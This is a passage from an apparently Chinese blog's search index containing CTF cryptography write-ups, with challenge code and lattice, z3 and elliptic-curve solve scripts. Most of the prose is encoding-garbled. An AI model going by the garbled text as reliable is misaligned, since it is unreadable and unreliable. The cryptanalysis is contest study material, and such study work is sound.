n_i \\0 &amp; -n_0 &amp; 0 &amp; \\cdots &amp; 0 \\0 &amp; 0 &amp; -n_0 &amp; \\cdots &amp; 0 \\\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\0 &amp;0&amp;0&amp;\\cdots&amp;-n_0\\end{pmatrix}$$è°ƒæ•´å‚æ•°$a$è§„çº¦æ ¼å­å°±èƒ½å¾—åˆ°$q_0$äº†, æœ‰äº†$q_0$æ±‚$flag$å°±ç®€å•äº† exp12345678910111213141516171819202122232425262728293031from sage.all import *from Crypto.Util.number import bytes_to_long,long_to_byteswith open('lN.bin','rb') as f: file = f.read()lN = []for i in range(0,len(file),64): lN.append(bytes_to_long(file[i:i+64])) N = []for n in lN: a = n // 2**104 if a not in N: N.append(a)LEN = len(N)B = LENprint(LEN)M = [[0 for _ in range(B)] for _ in range(B)]for i in range(500): M[0][0] = 2 ** i for j in range(1,B): M[0][j] = N[j] M[j][j] = -N[0] RES = Matrix(M).LLL()[0] if RES[0] % 2 ** i == 0: q = abs(RES[0] // 2 ** i) if q != 0 : R = N[0] % q m = ((N[0] - R) // q) % 2 ** 128 print(long_to_bytes(m))","link":"/2021/09/14/writeup-for-2021-RCTF/"},{"title":"writeup-for-2021-redhat CTF","text":"å¤§å®¶å¥½ï¼Œè¿™é‡Œk1rit0ï¼Œä»Šå¤©å¸¦å¤§å®¶äº†è§£çº¢å¸½æ¯Crypto wpã€‚åˆ°åº•æ˜¯æ€ä¹ˆä¸€å›äº‹å‘¢ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹å§ã€‚ è¯´èµ·çº¢å¸½æ¯ï¼Œç›¸ä¿¡å¤§å®¶ä¸€å®šå¾ˆç†Ÿæ‚‰ï¼Œä½†Cryptoæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±è®©å°ç¼–å¸¦å¤§å®¶ä¸€èµ·äº†è§£å§ å…¶å®ï¼ŒCryptoå°±æ˜¯searchï¼Œå¤§å®¶å¯èƒ½ä¼šæƒŠè®¶ï¼ŒCryptoç«Ÿç„¶å°±æ˜¯searchï¼ è¿™å°±æ˜¯Crypto wpäº†ï¼Œä¸çŸ¥é“å¤§å®¶æœ‰ä»€ä¹ˆæƒ³æ³•å‘¢ï¼Ÿæ¬¢è¿åœ¨å±å¹•ä¸‹æ–¹ç•™è¨€å“¦https://pwnthem0le.polito.it/2020/12/20/hxpCTF-2020-Hyper-writeup/https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/ XD XD XD XD ç¬‘æ­»æ ¹æœ¬ç¬‘ä¸æ­», å…¨æ˜¯æœ‰åŸé¢˜, åšçš„å¿«è¿˜ä¸å¦‚åˆ«äººæœçš„å¿«, ä¸è¿‡ç¬¬äºŒé¢˜è¶…æ¤­åœ†æ›²çº¿è¿˜åœ¨çœ‹paper, ç°åœ¨è¿˜æ˜¯ä¸ä¼š(24é¡µ, çœ‹éƒ½çœ‹ä¸æ‡‚) æ¸¸æˆä½“éªŒæå·®, åšå®Œé¢˜å°±åªèƒ½çœ‹ç€é˜Ÿå‹è¾“å‡º, é€†å‘çˆ·çˆ·å¼€å¿ƒåˆ°èµ·é£äº† å°±æŠŠè‡ªå·±åšç¬¬ä¸€é¢˜çš„æ€è·¯å†™ä¸€ä¸‹å§ primegameproblem123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python3from decimal import *import mathimport randomimport structfrom flag import flagassert (len(flag) == 48)msg1 = flag[:24]msg2 = flag[24:]primes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100 #è®¾ç½®æœ‰æ•ˆæ•°å­—keys = []for i in range(len(msg1)): keys.append(Decimal(primes[i]).ln())sum_ = Decimal(0.0)for i, c in enumerate(msg1): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)sum_ = Decimal(0.0)for i, c in enumerate(msg2): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct) analysesä¸€çœ‹åˆ°è¿˜ä»¥ä¸ºæ˜¯å°æ•°çš„èƒŒåŒ…é—®é¢˜, æ€ä¹ˆå¯èƒ½å˜›, çœ‹ä¸€ä¸‹å¼å­å°±èƒ½æ‡‚äº†$$ct = 2^{256}(k_0m_0 + k_1m_1 + k_2m_2 + \\cdots k_{23}m_{23}) - e$$è¿™é‡Œå¤šäº†ä¸ª$-e$ å°±æ˜¯æŠŠå–æ•´ç›´æ¥çœ‹æˆå‡å»ä¸€ä¸ªå°æ•°$e$äº† $k_n$æ˜¯å·²çŸ¥çš„, è€Œä¸”æ˜¯å°æ•°, ä¸èƒ½ç›´æ¥é€ æ ¼å­, ä½†æˆ‘ä»¬æŠŠ$2^{256}$åˆ†é…ç»™æ¯ä¸€é¡¹å°±ä¸ä¸€æ ·äº†, å¯¹äºå…¶ä¸­ä¸€é¡¹$$2^{256}km = 2^{256}\\ln p \\cdot m = (\\lfloor 2^{256} \\ln p \\rceil - eâ€™)\\cdot m$$è®°$\\lfloor 2^{256} \\ln p_i \\rceil = A_i$æ¯ä¸€é¡¹éƒ½è¿™ä¹ˆå¹², é‚£ä¹ˆæ•´ä¸ª$ct$å°±ä¼šå˜æˆ$$\\begin{align}ct &amp;= A_0m_0 + A_1m_1 + \\cdots + A_{23}m_{23} -(m_0e_0â€™+m_1e_1â€™+\\cdots+m_{23}e_{23}â€™ + eâ€™â€™) \\\\&amp; = A_0m_0 + A_1m_1 + \\cdots + A_{23}m_{23} -E\\end{align}$$å…¶ä¸­ç³»æ•°$A$éƒ½æ˜¯ç‰¹åˆ«å¤§çš„æ•°, è€Œ$m,E$éƒ½éå¸¸å°, è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥ç”¨èƒŒåŒ…é—®é¢˜çš„è§£æ³•æ±‚å‡º$m$ æ„é€ æ ¼å­$$\\begin{pmatrix}1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; A_0 \\\\0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; A_1 \\\\0 &amp; 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; A_2 \\\\\\vdots &amp;\\vdots &amp;\\vdots &amp;\\ddots&amp;\\vdots&amp;\\vdots \\\\0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; A_{23} \\\\0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; -ct\\end{pmatrix}$$è§„çº¦å°±èƒ½å¾—åˆ°$(m_0,m_1,\\cdots,m_{23},E)$äº† exp12345678910111213141516171819202122232425262728293031from decimal import *import mathprimes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100keys = []for i in range(24): keys.append(math.floor(Decimal(primes[i]).ln()*2**256))c1 = 597952043660446249020184773232983974017780255881942379044454676980646417087515453c2 = 425985475047781336789963300910446852783032712598571885345660550546372063410589918L = matrix([[0 for _ in range(25)] for _ in range (25)])for i in range(24): L[i,-1] = keys[i] L[i,i] = 1L[-1,-1] = -c1for i in L.LLL()[0][:-1]: print(chr(i),end='')L[-1,-1] = -c2for i in L.LLL()[0][:-1]: print(chr(i),end='')","link":"/2021/05/16/writeup-for-2021-redhat-CTF/"},{"title":"writeup for 2021 å·…å³°æå®¢ Crypto","text":"å•Šå¥½ä¹…æ²¡æ›´æ–°blogäº†, æ‰“äº†ä¸‹å·…å³°æå®¢, å†™ä¸€ä¸‹wpå§. MedicalImageä¸€ä¸ªå›¾ç‰‡åŠ å¯†è„šæœ¬, å‡½æ•°f(x)è¢«éšè—äº†, ä½†ç»™äº†æç¤º, æ˜¯logistic map, (åœ¨bç«™çœ‹ä¸‹è§†é¢‘, æ•°å­¦çœŸçš„å¥½ç¥å¥‡å•Š).è€Œä¸”å‚æ•°$r$æ˜¯æœ€å¤§åˆæ³•å€¼, ä¹Ÿå°±æ˜¯$4$, é‚£ä¹ˆå‡½æ•°f(x)ä¸º$$f(x) = 4x(1-x)$$ç„¶åå°±æ˜¯å¯¹ç€åŠ å¯†æµç¨‹å†™è§£å¯†äº†â€¦. æ²¡æœ‰å•¥ç‰¹åˆ«çš„ é€†ç€åŠ å¯†è¿‡ç¨‹å†™è§£å¯†å°±è¡Œ, p0,c0å°±é‚£å‡ ä¸ªå€¼çˆ†ç ´å°±è¡Œ, ä¸€å¼€å§‹éšä¾¿æ‹¿101,201è¯•äº†ä¸‹â€¦ç›´æ¥å¯¹äº† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from decimal import *from PIL import Imageimport numpy as npfrom time import timegetcontext().prec = 20R = Decimal(4)r1 = Decimal('0.478706063089473894123')r2 = Decimal('0.613494245341234672318')r3 = Decimal('0.946365754637812381837')const = 10 ** 14im = Image.open( r'flag_enc.bmp')size = im.sizew,h = sizeim = np.array(im)def f(x): return Decimal(4 * x * (1 - x))for i in range(200): r1 = f(r1) r2 = f(r2) r3 = f(r3)S = time()p0 = 101c0 = 201for x in range(w): for y in range(h): k = int(round(const*r3))%256 k = bin(k)[2:].ljust(8,'0') k = int(k[p0%8:]+k[:p0%8],2) r3 = f(r3) m0 = ((k ^ im[y,x] ^ c0 ) - k) % 256 c0 = im[y,x] p0 = m0 im[y,x] = m0arr = []for x in range(w): for y in range(h): x1 = int(round(const*r1))%w y1 = int(round(const*r2))%h arr += [(x,y,x1,y1)] r1 = f(r1) r2 = f(r2)for z in arr[::-1]: x,y,x1,y1 = z tmp = im[y,x] im[y,x] = im[y1,x1] im[y1,x1] = tmp m = Image.new('P', size,'white')pixels = m.load()for i in range(m.size[0]): for j in range(m.size[1]): pixels[i,j] = (int(im[j][i]))m.save(r'flag.bmp')print(time()-S) LearnSM4æœç„¶æ˜¯learnSM4, çœ‹äº†é¢˜ç›®é©¬ä¸Šè·‘å»å­¦SM4äº†, çœ‹äº†ä¸€ä¸‹åŠ å¯†è¿‡ç¨‹, ä¸éš¾ çœ‹é¢˜ç›®, è¦æ±‚åˆ©ç”¨ç»™å‡ºçš„åŠ å¯†è¿‡ç¨‹ä¸­çš„leakå¾—åˆ°è½®å¯†é’¥çš„ç¬¬ä¸€ä¸ª,ä¹Ÿå°±æ˜¯key[0] æ¥çœ‹çœ‹ç¬¬ä¸€è½®åŠ å¯†çš„è¿‡ç¨‹$$X_4 = X_0 \\oplus T(X_1 \\oplus X_2 \\oplus X_3 \\oplus rk_0) \\T(X) = r(S(X))$$è¿™ä¸ª$rk_0$å°±æ˜¯æˆ‘ä»¬è¦æ±‚çš„, $T(x)$æ˜¯ä¸¤ä¸ªå˜æ¢åˆåœ¨ä¸€èµ·çš„, è‡ªå·±æ‰‹åŠ¨è¯•äº†ä¸€ä¸‹, å‘ç°$r(x)$å˜æ¢æ—¶å¯ä»¥ç”¨z3æ¢­å‡ºæ¥çš„, $S(x)$ç›´æ¥å°±èƒ½é€†å‡ºæ¥ è€Œä¸Šé¢çš„ç­‰å¼ä¸­$X_0,X_1,X_2,X_3$æ˜¯è‡ªå·±æ„é€ çš„, $X_4$èƒ½åˆ©ç”¨é¢˜ç›®ç»™çš„leakå¾—åˆ°, ä¼ r=0,i=0~3å³å¯ è¿™é‡Œæˆ‘ç›´æ¥ä¼ $X_0 = 1 , X_1,X_2,X_3 = 0$, å¯ä»¥æœ‰$$rk_0 = T^{-1}(X_4 \\oplus 1 )$$ è¿™å‡ å¤©å†™è¿œç¨‹çš„è„šæœ¬å†™åäº†, çœŸä¸æƒ³å†™, æ‰‹æ‰“äº†è¿™é¢˜, expåªæœ‰ä¸€æ­¥ä¸€æ­¥çš„ éƒ½æ˜¯æœ¬åœ°è·‘å‡ºç»“æœæ‰‹åŠ¨è¾“å…¥ä¸Šå»çš„, è®²ç©¶ç€çœ‹å§(æ‡’) 12345678910111213141516171819202122232425262728293031323334def getnum(arr): HEX = '' for i in arr: HEX += hex(i)[2:] return int(HEX,16)# ç”¨z3é€†Tå˜æ¢ä¸­çš„r(x)def f(B): B1 = (((B &lt;&lt; 2 ) &amp; 0b1100000000000000000000000000000000) &gt;&gt;32) ^ (B &lt;&lt; 2) &amp; 0xffffffff B2 = (((B &lt;&lt; 10) &amp; 0b111111111100000000000000000000000000000000) &gt;&gt; 32) ^ (B&lt;&lt;10) &amp; 0xffffffff B3 = (((B &lt;&lt; 18) &amp; 0b11111111111111111100000000000000000000000000000000) &gt;&gt; 32) ^ (B&lt;&lt;18) &amp; 0xffffffff B4 = (((B &lt;&lt; 24) &amp; 0b11111111111111111111111100000000000000000000000000000000) &gt;&gt; 32) ^ (B&lt;&lt;24) &amp; 0xffffffff return B ^ B1 ^ B2 ^ B3 ^ B4 S = z3.Solver()x = z3.BitVec('x',64)S.add((getnum([161,203,79,94])^1)- f(x)==0)if S.check(): print(S.model())# é€†S(x)def findS(value): for i in range(256): if S_BOX[i] == value: return i print(hex(2217051833)[2:]) # 2217051833 z3æ¢­å‡ºçš„ç»“æœ# 0x842586b9key = '0'arr = [0x84,0x25,0x86,0xb9]for i in arr: key += hex(findS(i))[2:]print(int(key,16)) æŠŠæœ€åå¾—åˆ°çš„keyå€¼å‘è¿‡å»å°±å¥½äº†, è¿™é‡Œéƒ½æ²¡ç”¨åˆ°ç»™çš„hint, ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯éé¢„æœŸ crtrsa æœ‰ä¸€ç§å·²çŸ¥dpæ±‚pçš„æ–¹æ³• å¯ä»¥ç›´æ¥çˆ†ç ´dpç„¶åæ±‚å‡ºp è¿™åšå®¢å†™çš„è¶Šæ¥è¶Šæ‡’äº†å“ˆå“ˆ æœ‰ä»€ä¹ˆä¸æ¸…æ¥šçš„qqæ‰¾æˆ‘å§ 3519728596 è¿™æ ·ä¹ŸæŒºå¥½ è®°å½•ä¸€ä¸‹è‡ªå·±åšè¿‡çš„å°±å¥½äº†â€¦ æˆ‘æ˜¯fw","link":"/2021/07/31/writeup-for-2021-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"},{"title":"writeup for 2021è™ç¬¦","text":"å•Šå¤ªèœäº†å¤ªèœäº†â€¦æ‰“è¿™CTFä¹Ÿæœ‰åŠå¹´äº†,è¿˜æ˜¯è¿™ä¹ˆèœ,å¥½æƒ³æœ‰ä¸€æ¬¡èƒ½akå•Šâ€¦..ä¸¤é“é¢˜ä¸€é¢˜æ‰‹å¿«æ‰¾åˆ°èµ„æ–™æ‹¿äº†ä¸ªä¸‰è¡€, å¦å¤–ä¸€é¢˜åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, æœ‰æ¡å…³ç³»å¼ç†è§£é”™äº†çœŸçš„æƒ³é”¤äººâ€¦. 0x00 cubicproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from math import gcdfrom functools import reducefrom fractions import Fraction as FracN = 6def read_num(prompt): try: num = int(input(prompt)) except: return 0 return num if num &gt; 0 else 0print(f&quot;Please give me {N} pairs of positive integers (x,y,z) &quot; f&quot;satisfying the equation `x/(y+z) + y/(z+x) + z/(x+y) = {N}`\\n&quot;)anss = []mark = 0for i in range(N): x = read_num(&quot;[&gt;] x: &quot;) y = read_num(&quot;[&gt;] y: &quot;) z = read_num(&quot;[&gt;] z: &quot;) if x * y * z == 0: # positive integer mark = 1 print(&quot;This is not what i want!\\n&quot;) break if reduce(gcd, [x, y, z]) != 1: # (kx, ky, kz) mark = 1 print(&quot;This is not what i want!\\n&quot;) break if Frac(x, y+z) + Frac(y, z+x) + Frac(z, x+y) != N: mark = 1 print(&quot;This is not what i want!\\n&quot;) break ans = tuple(sorted([x, y, z])) # (y, x, z) if ans in anss: mark = 1 print(&quot;This is not what i want!\\n&quot;) break else: print(&quot;You are right!\\n&quot;) anss.append(ans)if mark == 0: flag = open('/flag', 'r').read() print(&quot;flag is: &quot; + flag + &quot;\\n&quot;)else: print(&quot;Something wrong!\\n&quot;) analysesæ‰¾åˆ°6ç»„$a,b,c$æ»¡è¶³:$${a \\over b+c}+{b \\over a+c}+{c \\over a+b} = 6$$è¿™é¢˜æ‹¿åˆ°å°±ç›´æ¥å»æœäº†, æ²¡æƒ³åˆ°ç›´æ¥å‡ºæ¥ä¸€ç¯‡çŸ¥ä¹çš„æ–‡ç« , çœ‹å®Œä¹‹åæ‰çŸ¥é“åŸæ¥æ˜¯æ¤­åœ†æ›²çº¿â€¦.åŸç†ä»€ä¹ˆçš„é‡Œé¢è®²çš„å¾ˆæ¸…æ¥šäº†, è¿™è¾¹å°±ä¸å†è¯´äº†, åªæ˜¯ä¸­é—´æœ‰ä¸€ä¸ªåŒ–å¼å­ä¸ºç»´å°”æ–¯ç‰¹æ‹‰æ–¯å½¢å¼çš„è¿‡ç¨‹, æˆ‘æ˜¯è¯¯æ‰“è¯¯æ’å¼„æˆçš„(å› ä¸ºå…¬å¼æ˜¯åŒä¸€ä¸ª, ç›´æ¥æ”¹ä¸€ä¸‹çŸ¥ä¹é‡Œçš„å°±è¡Œäº†), åæ¥æ‰¾åˆ°äº†paper - &gt; An unusual cubic representation problem, æ‰æ‰¾åˆ°å…·ä½“çš„å…¬å¼$$a={8(N+3)-x+y \\over 2(N+3)(4-x)} \\\\b={8(N+3)-x-y \\over 2(N+3)(4-x)} \\\\c={-4(N+3)-x(N+2) \\over (N+3)(4-x)}$$è¿™é‡Œçš„$N = 6$æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å°±èƒ½æŠŠå¼å­åŒ–æˆ$y^2 = ax^3 + bx^2+cx$çš„å½¢å¼äº†, è¿™é‡Œåˆæœ‰ä¸ªé—®é¢˜, è¯¥æ€ä¹ˆåˆ©ç”¨ä¸Šé¢çš„å¼å­å¿«é€ŸåŒ–æˆæˆ‘ä»¬è¦çš„å½¢å¼å‘¢å½“ç„¶æ˜¯æ‹¿è‰ç¨¿çº¸ç®—å•¦ è¿™é‡Œå¯ä»¥åˆ©ç”¨sageçš„è§£æ–¹ç¨‹, è§£å‡ºè¿™ä¸ªå…³ç³»å¼æ¥ 12345678a,b,c,x,y = var('a'),var('b'),var('c'),var('x'),var('y')N = 6a=(8*(N+3)-x+y)/(2*(N+3)*(4-x))b=(8*(N+3)-x-y)/(2*(N+3)*(4-x))c=(-4*(N+3)-(N+2)*x)/((N+3)*(4-x))f = a^3 + b^3 +c^3 - 9*a*b*c - 5*(a^2*b+a^2*c+b^2*a+b^2*c+c^2*a+c^2*b)print(f.solve(y)[0])# y == -sqrt(x^3 + 213*x^2 + 288*x) ç„¶ååˆ©ç”¨è§£å‡ºæ¥çš„å‚æ•°è·Ÿç€çŸ¥ä¹ä¸Šçš„å†…å®¹å†™ä»£ç å°±è¡Œäº†, è¦çŸ¥é“åŸç†å°±å»çŸ¥ä¹çœ‹å§, é“¾æ¥ä¹Ÿåœ¨ä¸Šé¢äº† exp12345678910111213141516171819202122232425262728293031323334353637383940a,b,c,x,y = var('a'),var('b'),var('c'),var('x'),var('y')N = 6a=(8*(N+3)-x+y)/(2*(N+3)*(4-x))b=(8*(N+3)-x-y)/(2*(N+3)*(4-x))c=(-4*(N+3)-(N+2)*x)/((N+3)*(4-x))f = a^3 + b^3 +c^3 - 9*a*b*c - 5*(a^2*b+a^2*c+b^2*a+b^2*c+c^2*a+c^2*b)print(f.solve(y)[0])ee=EllipticCurve([0,213,0,288,0])P = ee(-200,680)def check(num): return num if num &gt; 0 else 0def orig(P,N): x=P[0] y=P[1] a=(8*(N+3)-x+y)/(2*(N+3)*(4-x)) b=(8*(N+3)-x-y)/(2*(N+3)*(4-x)) c=(-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da=denominator(a) db=denominator(b) dc=denominator(c) l=lcm(da,lcm(db,dc)) return [a*l,b*l,c*l]i = 1arr = []while True: f = True res = orig(i*P,6) for j in res: if check(j) == 0: f = False if f: arr.append(res) i+=1 if len(arr) == 6: breakarr 0x01 simultaneousproblem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from functools import reducefrom flag import flagdef encrypt(m, e, n): n = int(n) size = n.bit_length() // 2 m_low = m &amp; ((1 &lt;&lt; size) - 1) m_high = (m &gt;&gt; size) b = (m_low**2 - m_high**3) % n EC = EllipticCurve(Zmod(n), [0, b]) return (EC((m_high, m_low)) * e).xy()def decrypt(c, d, n): n = int(n) size = n.bit_length() // 2 c_high, c_low = c b = (c_low**2 - c_high**3) % n EC = EllipticCurve(Zmod(n), [0, b]) m_high, m_low = (EC((c_high, c_low)) * d).xy() m_high, m_low = int(m_high), int(m_low) return (m_high &lt;&lt; size) | m_lowdef gen_prime(size): p = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) while p % 3 != 2: p = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) q = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) while q % 3 != 2: q = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) if q &gt; p: p, q = q, p return ZZ(p), ZZ(q)SIZE = 512HINTSIZE = 96assert len(flag) == 42flag = int.from_bytes(flag, &quot;big&quot;)masks = [randint(1 &lt;&lt; (SIZE-1), 1 &lt;&lt; SIZE) for _ in range(3)] # 2^512 bits ä¸‰ä¸ªmasked_flag = reduce(lambda a, b: a ^^ b, masks, flag) # å››ä¸ªä¸€èµ·å¼‚æˆ–count = 0ciphertexts = []x = random_prime(floor((1&lt;&lt;(2*SIZE-2))**0.373), proof=False) while count &lt; 3: try: p, q = gen_prime(SIZE) n = p * q y = random_prime(floor(n**0.373), proof=False) zbound = -1 * int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q))) z_ = zbound + ((p + 1)*(q + 1)*y - zbound) % x e = ((p + 1) * (q + 1) * y - z_) // x assert (e*x - y*(p+1)*(q+1) == -z_) assert (abs(z_) &lt; abs(zbound)) assert (gcd(x, y) == 1) d = inverse_mod(e, (p+1)*(q+1)) c = encrypt(masks[count], e, n) assert decrypt(c, d, n) == masks[count] ciphertexts.append({ &quot;n&quot;: n, &quot;e&quot;: e, &quot;c&quot;: c, &quot;hint&quot;: p &amp; ((1&lt;&lt;HINTSIZE)-1) }) count += 1 except KeyboardInterrupt: break except ZeroDivisionError: passprint(&quot;masked_flag = &quot;, masked_flag)print(&quot;ciphertexts = &quot;, ciphertexts) analysesç”¨çš„ECCåŠ å¯†äº†ä¸‰ä¸ªmasked_flag, ä½†åŸºæœ¬ä¸Šæ²¡åŠæ³•ä»ECCä¸Šå…¥æ‰‹. å›æ¥çœ‹å‰é¢çš„å¯†é’¥ç”Ÿæˆ. è¿™é‡Œæ¯ä¸€è½®çš„ç§é’¥éƒ½æ˜¯ä¸åŒçš„, æ¯ä¸€è½®éƒ½éšæœºç”Ÿæˆç´ æ•°y, å¹¶åˆ©ç”¨x,yä¸¤ä¸ªç´ æ•°ç”Ÿæˆä¸€ä¸ªå…¬é’¥e å› ä¸ºæ¯è½®ç”¨çš„xéƒ½æ˜¯ç›¸åŒçš„, è€Œä¸”æˆ‘ä»¬æœ‰å…³ç³»å¼:$$\\begin{cases}e_1 x = y_1(p_1+1)(q_1+1) - z_1 \\\\e_2 x = y_2(p_2+1)(q_2+1) - z_2 \\\\e_3 x = y_3(p_3+1)(q_3+1) - z_1\\end{cases}$$åŒ–ç®€ä¸€ä¸‹å¯ä»¥æœ‰:$$\\begin{cases}e_1 x -y_1n_1 = y_1(p_1+q_1+1) - z_1 \\\\e_2 x -y_2n_2 = y_2(p_2+q_2+1) - z_2 \\\\e_3 x -y_3n_3 = y_3(p_3+q_3+1) - z_3\\end{cases}$$è®°$y_i(p_i+q_i+1) - z_i$ä¸º$s_i$, å¯ä»¥é€ å‡ºè¿™ä¸ªä¸€ä¸ªæ ¼å­$$(x,y_1,y_2,y_3)\\begin{pmatrix}\\sqrt n&amp;e_1&amp;e_2&amp;e_3 \\\\0&amp;-n_1&amp;0&amp;0 \\\\0&amp;0&amp;-n_2&amp;0 \\\\0&amp;0&amp;0&amp;-n_3 \\\\\\end{pmatrix}=(\\sqrt nx,s_1,s_2,s_3)$$è¿™é‡Œçš„$x$å’Œ$y$éƒ½å¤Ÿå°, è¶³å¤Ÿè§„çº¦å‡ºç»“æœæ¥.è§„çº¦å‡º$(\\sqrt nx,s_1,s_2,s_3)$å¯ä»¥æ±‚å‡º$x$å’Œ$y$ å½“æ—¶åšåˆ°è¿™é‡Œ, è¢«è¶…å¤§çš„$z$å¡ä½äº†, åšäº†ä¸€ä¸‹åˆéƒ½æ²¡æœ‰æƒ³å‡ºè¯¥æ€ä¹ˆç”¨Hint,x,yæŠŠpæå‡ºæ¥. (zboundæœ‰å…³çš„å¼å­è¢«æˆ‘å¼„é”™äº†!! æ²¡æœ‰æƒ³åˆ°è¿™ä¸ªzboundè™½ç„¶è¢«æ¶ˆå»ä½†è¿˜æ˜¯æœ‰ä½œç”¨çš„!) æ¯”èµ›ç»“æŸä»¥åd33å¸ˆå‚…å‘äº†ä¸€ç¯‡paper, ä½†æ˜¯ä¸èƒ½ç›´æ¥ç”¨é‡Œé¢çš„æ–¹æ³•æ±‚,(ç•Œå¡çš„å¤ªæ­»äº†?) è¯´æ˜¯è¦åˆ©ç”¨coppersmithçš„å§¿åŠ¿å’Œhintä¸€ç‚¹ä¸€ç‚¹çš„æŠŠpæ•´å‡ºæ¥. çœ‹äº†ä¸€å¤©copperä¹Ÿæ²¡å•¥ç»“æœ, åªèƒ½ç­‰wpäº†. å‡ºæ¥äº†å†å¥½å¥½çœ‹çœ‹åˆ°åº•è¯¥æ€ä¹ˆè°ƒcoppersmith åæ¥ç¿»è™ç¬¦wpç¿»åˆ°ä¸€ç¯‡wpé‡Œé¢æœ‰ä¸€ä¸ªäºŒåˆ†æ³•çš„æ–¹æ³•, çœ‹å®Œæ‰å‘ç°åŸæ¥è‡ªå·±ä¸€ç›´æŠŠzboundçš„å¼å­æé”™äº†â€¦ ä¸è¿‡å°±ç®—æ²¡æé”™è‡ªå·±ä¹Ÿå¯èƒ½æƒ³ä¸åˆ°é‚£ä¸ªæ„é€ æ–¹ç¨‹çš„æ–¹æ³•, è™½ç„¶é‚£ä¸ªæ–¹æ³•ä¸ç®—ç‰¹åˆ«å¤æ‚, ä¹Ÿç®—æ˜¯å¥½å¥½å­¦ä¹ äº†ä¸€æ³¢ å‚è€ƒè¿™é‡Œçš„äºŒåˆ†æ³•å…ˆæ¥çœ‹ä¸€ä¸‹ç”Ÿæˆ$zbound$å’Œ$z$çš„ç­‰å¼$$zbound = \\lfloor {(p-q)\\cdot \\lfloor n^{1\\over 4}\\rceil \\cdot y \\over 3(p+q)} \\rceil \\\\z = zbound + (y(p+1)(q+1) - zbound \\mod x)$$è¿™é‡Œæˆ‘ä¸€å¼€å§‹åšçš„æ—¶å€™å¿½ç•¥äº†ä¸€ä¸ªç»†èŠ‚, $y(p+1)(q+1) - zbound \\mod x$æ˜¯å°äº$x$çš„! è€Œ$y$æ˜¯ç•¥å¤§äº$x$çš„,é‚£ä¹ˆä¼šæœ‰$${z \\over y} =\\lfloor {(p-q)\\cdot \\lfloor n^{1\\over 4}\\rceil \\over 3(p+q)} \\rceil +{(y(p+1)(q+1) - zbound \\mod x) \\over y} \\approx \\lfloor {(p-q)\\cdot \\lfloor n^{1\\over 4}\\rceil \\over 3(p+q)} \\rceil \\tag 1$$ç¬¬äºŒé¡¹, ä¹Ÿå°±æ˜¯çœç•¥æ‰çš„é‚£ä¸ªé¡¹æ˜¯å°äº$1$çš„, æ‰€ä»¥è¿™ä¸ªçº¦ç­‰äºä¸¤è¾¹å…¶å®æ˜¯éå¸¸éå¸¸æ¥è¿‘çš„. æˆ‘ä»¬ä¸Šé¢è®¡ç®—äº†$s = y(p+q+1) - z$, å†æ ¹æ®$(1)$å¼, å°±å¯ä»¥æœ‰$${s \\over y} = p + q + 1 - {z \\over y} \\approx p+q+1-\\lfloor {(p-q)\\cdot \\lfloor n^{1\\over 4}\\rceil \\over 3(p+q)} \\rceil$$æˆ‘ä»¬å¯ä»¥æŠŠåé¢çš„$\\lfloor \\rceil$å…ˆå¿½ç•¥, å› ä¸ºå®ƒçš„å½±å“å¹¶ä¸å¤§. æˆ‘ä»¬è®°$K = \\lfloor {s \\over y} \\rceil$, å¼å­ä¼šæ˜¯$p+q$å’Œ$p-q$çš„ä¸€ä¸ªå…³ç³»(å…¶å®è¿™é‡Œå·²ç»å¼$p,q$çš„ä¸€ä¸ªå…³ç³»å¼äº†, ç†è®ºä¸Šæ ¹æ®$n = pq$å·²ç»å¯ä»¥è§£æ–¹ç¨‹å¾—åˆ°$p$çš„è¿‘ä¼¼äº†, ä½†æ˜¯ä¸ºäº†è®¡ç®—ä¸Šçš„æ–¹ä¾¿, æ‰çœ‹æˆ$p+q$å’Œ$p-q$$$K = p+q+1-{(p-q) \\cdot \\lfloor n^{1\\over 4}\\rceil \\over 3(p+q)}$$ç§»é¡¹, å¹¶åˆ©ç”¨$(p-q)^2 = (p+q)^2 - 4pq$,å¯ä»¥æŠŠå¼å­åŒ–æˆä¸€ä¸ªå…³äº$p+q$çš„æ–¹ç¨‹$$9((K-1)(p+q)-(p+q)^2 )^2 - n^{1 \\over 2}((p+q)^2 - 4n) = 0 \\\\9X^2(K-X-1)^2 - n^{1 \\over 2}(X^2 - 4n) = 0$$ä½†æ˜¯å‰é¢ç”¨äº†å¤ªå¤šçš„è¿‘ä¼¼, 